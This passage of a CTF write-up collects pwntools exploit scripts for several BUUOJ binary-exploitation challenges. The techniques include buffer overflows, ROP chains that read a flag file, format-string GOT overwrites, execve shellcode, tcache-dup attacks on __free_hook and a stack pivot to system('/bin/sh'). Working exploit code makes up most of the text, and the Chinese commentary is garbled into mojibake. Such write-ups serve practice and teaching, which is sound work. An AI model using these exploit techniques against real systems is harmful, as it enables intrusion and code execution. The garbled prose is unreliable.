local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27585)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()ru(&#39;0x&#39;)libc_base = int(r(12),16) - libc.sym[&#39;puts&#39;]info_addr(&#39;libc_base&#39;,libc_base)pop_rdi = 0x0000000000021102 + libc_basepop_rsi = 0x00000000000202e8 + libc_basepop_rdx = 0x0000000000001b92 + libc_baseopen = libc_base+libc.sym[&#39;open&#39;]read = libc_base+libc.sym[&#39;read&#39;]puts = libc_base+libc.sym[&#39;puts&#39;]buf = libc_base+libc.sym[&#39;__free_hook&#39;]payload = flat([    pop_rdi,0,pop_rsi,buf,pop_rdx,8,read,    pop_rdi,buf,pop_rsi,0,pop_rdx,0,open,    pop_rdi,3,pop_rsi,buf,pop_rdx,0x30,read,    pop_rdi,buf,puts])sa(&#39;:&#39;,payload)# debug()ret = libc_base + 0x0000000000000937payload = &#39;a&#39; * 0x78 + p64(ret)sa(&#39;?&#39;,payload)sleep(1)# debug()s(&#39;./flag\x00\x00&#39;)itr()</code></pre><h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer overflow 1"></a><code>picoctf_2018_buffer overflow 1</code></h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œä¸”å­˜åœ¨åé—¨ã€‚</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_buffer_overflow_1&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29988)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win = 0x080485CBoffset = 0x28 + 0x4payload = &#39;a&#39;*offset + p32(win)sa(&#39;:&#39;,payload)itr()</code></pre><h2 id="picoctf-2018-buffer-overflow-2"><a href="#picoctf-2018-buffer-overflow-2" class="headerlink" title="picoctf_2018_buffer overflow 2"></a><code>picoctf_2018_buffer overflow 2</code></h2><p>ç±»ä¼¼ä¸Šé¢˜ï¼Œè€ƒä¸ªæ§åˆ¶ä¼ å‚ã€‚</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_buffer_overflow_2&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29988)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win = 0x80485CBoffset = 0x6c + 0x4payload = &#39;a&#39;*offset + p32(win) + p32(0xDEADBEEF) + p32(0xDEADBEEF) + p32(0xDEADC0DE)s(payload)</code></pre><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><code>axb_2019_fmt32</code></h2><p>32ä½çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè€ƒçš„æ˜¯å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œå› ä¸ºæ˜¯32ä½pwntoolsçš„<code>fmtstr_payload</code>æ˜¯ååˆ†å¥½ç”¨çš„ã€‚</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./axb_2019_fmt32&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29147)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()printf_got = 0x804A014payload = &quot;%9$sA&quot; + p32(0x804A014)sla(&#39;me:&#39;,payload)ru(&#39;Repeater:&#39;)printf_got = uu32(r(4))libc_base = printf_got - 0x049020info_addr(&#39;libc_base&#39;,libc_base)offset = 8rce = libc_base + 0x3a80cinfo_addr(&#39;rec&#39;,rce)payload = &#39;a&#39; + fmtstr_payload(offset,{0x804A014:rce},write_size = &quot;byte&quot;,numbwritten = 10)sla(&#39;me:&#39;,payload)itr()</code></pre><h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a><code>pwnable_start</code></h2><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>32ä½ï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œä½œè€…è‡ªå·±æ±‡ç¼–å†™çš„ç¨‹åºã€‚<br>åˆ†ææ±‡ç¼–ä»¥åå¯ä»¥è®¤ä¸ºå°±æ˜¯ï¼š</p><pre><code class="c">write(1,esp,20)read(0,esp,60)</code></pre><p>ååˆ†æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯éš¾ç‚¹åœ¨shellcodeæ‘†ä¸Šæ ˆä»¥åï¼Œå¦‚ä½•è·³è½¬è¿‡å»æ‰§è¡Œã€‚</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ul><li>åˆ©ç”¨æ§åˆ¶eipï¼Œè¿”å›wirteå¤„ï¼Œæ³„æ¼ä¸€ä¸‹æ ˆåœ°å€ï¼Œç„¶åæ ¹æ®åç§»ç®—å‡ºespçš„åœ°å€</li><li>æ‘†shellcodeä¸Šæ ˆï¼Œæ§åˆ¶å¥½eip</li></ul><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./start&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27834)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()# debug()payload = &#39;a&#39; * 0x14 + p32(0x08048087)sa(&quot;:&quot;,payload)new_esp = uu32(r(4)) - 4addr_shellcode = new_esp + 0x14 + 4info_addr(&#39;new esp&#39;,new_esp)shellcode  = &quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;shellcode += &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;shellcode += &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;s(&#39;a&#39; * 0x14 + p32(addr_shellcode) + shellcode)itr()</code></pre><p>Shell code ç½‘ä¸Šä¸€æ‰¾æœ‰å¾ˆå¤šï¼Œæ‰¾åˆ°ä¸€ä¸ªåˆé€‚å­—èŠ‚é™åˆ¶ï¼Œä¸”å¯ä»¥æ‰§è¡Œçš„å³å¯ã€‚</p><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a><code>inndy_rop</code></h2><p>åšæ³•è·Ÿ <code>cmcc_simplerop</code>åŸºæœ¬ä¸€æ ·ï¼Œé™¤äº†åç§»ã€‚</p><p>32ä½ä¸‹ï¼Œ<code>sys_execve(&quot;sh&quot;, 0, 0, 0)</code> è¡Œä¸é€šã€‚ï¼ˆä¸Šæ¥æµ‹è¯•è¿™ä¸ªï¼Œæµ‹è¯•ä¸€é˜µå­ï¼‰</p><h2 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="BJDCTF 2nd secret"></a>BJDCTF 2nd secret</h2><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ…¢æ…¢åˆ†æå¯ä»¥å‘ç°ä¸€ä¸ªæº¢å‡ºç‚¹ï¼Œä¸”åˆ©ç”¨æ­¤å¤„åªæ˜¯å¯ä»¥åšåˆ°ä»»æ„åœ°å€çš„æ•°æ®å‡1ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/MX0AfS.png" srcset="/img/loading.gif" alt></p><p>ç„¶åæƒ³åˆ°å¯ä»¥åœ¨gotè¡¨å¤„ä¸‹æ‰‹ï¼Œ<strong>å…¶ä¸­printfã€systemå‡½æ•°åœ¨ç¨‹åºè¾¾åˆ°ä¸€å®šæ¡ä»¶æ‰ä¼šè¿è¡Œã€‚æ‰€ä»¥å…¶gotå¤„çš„å€¼æ˜¯ç‰¹å®šçš„ï¼Œå¹¶ä¸”æ˜¯ç›¸è¿‘çš„ã€‚</strong></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XkCKMA.png" srcset="/img/loading.gif" alt></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œç›¸å·®10ã€‚ç„¶ååˆ©ç”¨åŸæ¥çš„æº¢å‡ºç‚¹ï¼Œæ”¾å…¥printfçš„gotè¡¨åœ°å€ï¼Œè®©å…¶å‡10æ¬¡1ï¼Œä¹Ÿå°±æ˜¯ç­”å¯¹10æ¬¡serectåï¼Œè®©ç¨‹åºèµ°å‘ç»“æŸå¤„ï¼Œè°ƒç”¨printfã€‚å…¶printfçš„bufæ‰“å°çš„æ˜¯nameï¼Œè¿™ä¸ªæ˜¯å¯æ§çš„ï¼Œå†™æˆ<code>/bin/sh\x00</code>å³å¯ã€‚</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./secret&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29635)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()payload = &#39;/bin/sh\x00&#39; + &quot;\x00&quot; * 8 + p64(elf.got[&#39;printf&#39;])[:5]#æ­¤å¤„payload å› ä¸ºreadé‚£é‡Œè¯»çš„æ•°æ®å¤§å°é™åˆ¶ï¼Œéœ€è¦è°ƒæ•´ä¸€ä¸‹payloadçš„é•¿åº¦ã€‚# debug()sla(&quot;What&#39;s your name?&quot;,payload)answer = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]for i in range(len(answer)):    print(answer[i])    sa(&quot;Secret&quot;,str(answer[i]))sla(&quot;Secret&quot;,&#39;1&#39;)itr()</code></pre><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><code>ciscn_2019_es_1</code></h2><h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>64ä½ï¼Œubuntu 18.  å­˜åœ¨ UAFï¼Œååˆ†ç®€å•çš„tcache dupæ”»å‡»ã€‚</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_es_1&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29639)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce18 = [0x4f2c5,0x4f322,0x10a38c]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    gdb.attach(io)    pause()def add(size,name,call):    sla(&#39;ice:&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;name&#39;,str(name))    sa(&#39;call&#39;,str(call))def show(idx):    sla(&#39;ice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def call(idx):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))add(0x500,&#39;chumen77&#39;,&#39;chumen77&#39;) #0add(0x80,&#39;chumen77&#39;,&#39;chumen77&#39;) #1# debug()call(0)show(0)ru(&#39;name:\n&#39;)libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc&#39;,libc_base)#get libcadd(0x510-0x20-0x10,&#39;chumen77&#39;,&#39;chumen77&#39;) #2add(0x20,&#39;chumen77&#39;,&#39;chumen77&#39;) #3call(3)call(3)free_hook = libc_base + 0x3ed8e8add(0x20,p64(free_hook),p64(free_hook)) #4add(0x20,p64(free_hook),p64(free_hook)) #5rec = rce18[1] + libc_baseadd(0x20,p64(rec),p64(rec))call(1)itr()</code></pre><h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><h3 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code class="c">int vul(){  char s; // [esp+0h] [ebp-28h]  memset(&amp;s, 0, 0x20u);  read(0, &amp;s, 0x30u);  printf(&quot;Hello, %s\n&quot;, &amp;s);  read(0, &amp;s, 0x30u);  return printf(&quot;Hello, %s\n&quot;, &amp;s);}</code></pre><ul><li>å­˜åœ¨æ ˆæº¢å‡ºï¼Œæº¢å‡º8ä¸ªå­—èŠ‚ï¼Œè€ƒè™‘æ ˆè½¬ç§»ã€‚</li><li>åœ¨å¡«å……bufï¼Œ <code>%s</code> åœ¨32ä½ç”¨äºæ³„æ¼æ ˆä¸Šçš„ä¿¡æ¯ã€‚</li></ul><p>æ‰€ä»¥å¯ä»¥è€ƒè™‘æ³„æ¼å¤„æ ˆåœ°å€ï¼Œlibcåœ°å€ã€‚ä»è€Œç®—å‡ºbufçš„baseä¸libc baseã€‚</p><p>é¦–å…ˆå¯ä»¥æ˜ç¡®ä¸€ç‚¹å¯ä»¥è¦†ç›–è¿”å›åœ°å€ï¼Œç¬¬ä¸€ä¸‹è€ƒè™‘ç›´æ¥è¦†ç›–ä¸º<code>one_gadget</code> æœ¬åœ°é€šè¿œç¨‹ä¸é€šã€‚</p><p>ç„¶åå°±è€ƒè™‘ç”¨æ ˆè½¬ç§»åˆ°bufä¸Šæ¥è·å–shellã€‚</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_s_4&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26932)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()payload = &#39;a&#39; * (0x28 - 1 ) + &#39;b&#39;sa(&#39;name&#39;,payload)ru(&quot;b&quot;)buf_base = uu32(r(4)) - 0x38r(4)libc_base = uu32(r(4)) - 0x1fb9b0info_addr(&#39;stack&#39;,buf_base)info_addr(&#39;libc&#39;,libc_base)payload = p32(0x8048450) + p32(elf.plt[&#39;system&#39;]) + p32(0x8048450) + p32(buf_base+16) + &#39;/bin/sh\x00&#39;payload = payload.ljust((0x30-4-4-8),&#39;b&#39;) + p32(buf_base) *3+ p32(0x80485FD)s(payload)itr()</code></pre><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a><code>ciscn_2019_final_2</code></h2><h3 id="åˆ†æ-11"><a href="#åˆ†æ-11" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç¨‹åºå¾ˆç®€å•ï¼Œä½†æ˜¯ä¹Ÿå¾ˆç»†èŠ‚ï¼Œç”±äºè‡ªå·±çš„é€†å‘èƒ½åŠ›æœ‰ç‚¹å·®ï¼Œæ²¡æœ‰æ³¨æ„éƒ¨åˆ†ç»†èŠ‚ï¼Œé€ æˆæ„é€ å †å—ï¼Œè¿›è¡Œleakå’Œæ”¹å†™æ—¶ï¼Œé€ æˆè¾ƒå¤§çš„å›°éš¾å’Œè¿·æƒ‘ã€‚</p><p>å¼€å¯äº†æ²™ç›’ä¸èƒ½get shellï¼š</p><pre><code>#  line  CODE  JT   JF      K# =================================#  0000: 0x20 0x00 0x00 0x00000004  A = arch#  0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number#  0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005#  0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007#  0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007#  0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW#  0007: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>UAF</li></ul><p>æ¯”å¦‚ï¼š</p><h4 id="ç¨‹åºå¤„ï¼š"><a href="#ç¨‹åºå¤„ï¼š" class="headerlink" title="ç¨‹åºå¤„ï¼š"></a>ç¨‹åºå¤„ï¼š</h4><h5 id="addå‡½æ•°ï¼š"><a href="#addå‡½æ•°ï¼š" class="headerlink" title="addå‡½æ•°ï¼š"></a>addå‡½æ•°ï¼š</h5><pre><code class="c">int *v0; // rbx__int16 v1; // ax</code></pre><pre><code class="c"> v0 = (int *)int_pt; *v0 = get_atoi(); *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt;</code></pre><pre><code class="c">v1 = get_atoi();*(_WORD *)short_pt = v1;*((_WORD *)short_pt + 4) = *(_WORD *)short_pt;</code></pre><p>å¼€å§‹å¯¹æ•°æ®ç±»å‹çš„å¤§å°æ²¡æœ‰æ³¨æ„ï¼Œè¿™å‡ å¤„å†³å®šç€</p><ul><li>intå‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š4å­—èŠ‚çš„æ•°æ®</li><li>short int å‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š2å­—èŠ‚çš„æ•°æ®</li></ul><h5 id="showå‡½æ•°ï¼š"><a href="#showå‡½æ•°ï¼š" class="headerlink" title="showå‡½æ•°ï¼š"></a>showå‡½æ•°ï¼š</h5><pre><code class="c">if ( v2 == 1 &amp;&amp; int_pt )    printf(&quot;your int type inode number :%d\n&quot;, *(unsigned int *)int_pt);  if ( v2 == 2 &amp;&amp; short_pt )    printf(&quot;your short type inode number :%d\n&quot;, (unsigned int)*(signed __int16 *)short_pt);</code></pre><p>æ„å‘³ç€leakæ—¶ä¹Ÿæ˜¯åªèƒ½æ³„æ¼å‡ºéƒ¨åˆ†çš„å­—èŠ‚ï¼Œå¢åŠ åœ¨åˆ©ç”¨æ—¶çš„éš¾åº¦ï¼Œéœ€è¦åˆ©ç”¨åˆé€‚çš„å †å—è¿›è¡Œæ”»å‡»ï¼Œå…¶åˆé€‚æ˜¯æŒ‡ä¸Šé¢æœ‰æ®‹ç•™åˆé€‚çš„æ•°æ®ï¼Œç„¶åæ”¹æœ«å°¾å‡ ä¸ªå­—èŠ‚ã€‚</p><h4 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h4><p>scanfå‡½æ•°æ˜¯ä»stdinä¸­è¯»å–æ•°æ®ï¼Œä¸”åœ¨<code>__IO_2_stdio_</code> çš„ioç»“æ„ä½“å­˜åœ¨ä¸€ä¸ª<code>_fileno</code>çš„æ ‡è¯†ä½ï¼Œé»˜è®¤å€¼æ˜¯0ï¼Œè‹¥å°†å…¶æ”¹æˆå…¶ä»–çš„æ–‡ä»¶å·ï¼Œè°ƒç”¨scanfå‡½æ•°åœ¨è·å–æ—¶ï¼Œå°±ä¼šè·å–å¯¹åº”æ–‡ä»¶ã€‚</p><h4 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h4><ul><li>ç¨‹åºåªè®©ä½ åˆ†é…0x30æˆ–è€…0x20çš„å †å—ï¼Œå¦‚ä½•ä¼ªé€ å‡ºä¸€ä¸ªè‡³å°‘0x90çš„å †å—ï¼Œå¦‚ä½•é‡Šæ”¾åï¼Œæ¥æ³„æ¼libcã€‚</li><li>æ³„æ¼å‡ºæ¥çš„æ•°æ®ä¸æ˜¯å®Œæ•´çš„ï¼Œå¯å†™æ—¶åªèƒ½å†™ä¸Š2ã€4å­—èŠ‚</li></ul><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_final_2&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25252)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(type,number):    sla(&#39;&gt;&#39;,&#39;1&#39;)    sla(&#39;&gt;&#39;,str(type))    sla(&quot;:&quot;,str(number))def free(type):    sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;&gt;&#39;,str(type))def show(type):    sla(&#39;&gt;&#39;,&#39;3&#39;)    sla(&#39;&gt;&#39;,str(type))def leave():    sla(&#39;&gt;&#39;,&#39;4&#39;)    # sa(&#39;?&#39;,str(mes))add(1,1)free(1) #leave chunk 0 add(2,2)add(2,2)add(2,2) # 0x90#ready to dupadd(2,2)free(2)add(1,1) # get chunk0free(2)#leak heapshow(2)ru(&#39;number :&#39;)chunk0_addr_word = int(ru(&#39;\n&#39;)) - 0xa0info_addr(&#39;chunk0_addr&#39;,chunk0_addr_word)add(2,chunk0_addr_word)add(2,chunk0_addr_word)add(2,0x91) #fake unsortbin chunk#full tache binsfor i in range(7):    free(1)    add(2,2)#leak libcfree(1)show(1)ru(&#39;number :&#39;)stdin_fillno = int(ru(&#39;\n&#39;)) - 0x2a0 + 0x70info_addr(&#39;stdin_fillno&#39;,stdin_fillno)#ready to attack stdin_fillno ,use taeche dupadd(1,stdin_fillno)add(1,stdin_fillno)free(1)add(2,stdin_fillno)free(1)#leak contains libc&#39;s heapshow(1)ru(&#39;number :&#39;)chunk1_addr_dword = int(ru(&#39;\n&#39;)) - 0x30info_addr(&#39;chunk1_addr_dword&#39;,chunk1_addr_dword)#change the 0x30bins chainsadd(1,chunk1_addr_dword)add(1,chunk1_addr_dword)add(1,stdin_fillno)#attck the filenoadd(1,666)leave()itr()</code></pre><p>æ¸£æ¸£è‹±æ–‡æ³¨é‡Šï¼Œå…ˆä¸æ”¹äº†ã€‚æ„Ÿè§‰è¿˜æ˜¯æŒºä¸å®¹æ˜“åšçš„é¢˜ï¼Œå †å—å¦‚ä½•æ„é€ 